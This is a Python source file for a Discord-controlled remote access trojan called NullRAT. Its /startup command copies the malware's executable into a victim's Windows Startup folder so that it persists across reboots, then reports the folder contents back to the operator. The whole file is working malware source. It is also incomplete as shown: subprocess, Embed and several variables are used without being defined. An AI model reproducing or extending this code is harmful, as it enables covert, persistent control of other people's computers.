import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Startup(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def startup(self, ctx, victim):
        """Add NullRAT to startup directory
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.ip_addr):
            from sys import executable; msg = "```\n"
            await ctx.response.send_message(embed = Embed(title = "Last known RAT directory: \n" + original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
            os.chdir(original_dir)
            await ctx.followup.send(embed = Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            for value in os.listdir(): msg += f'{value}\n'
            msg += "```"; await ctx.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))

def setup(bot: commands.Bot):
    bot.add_cog(Startup(bot)) 
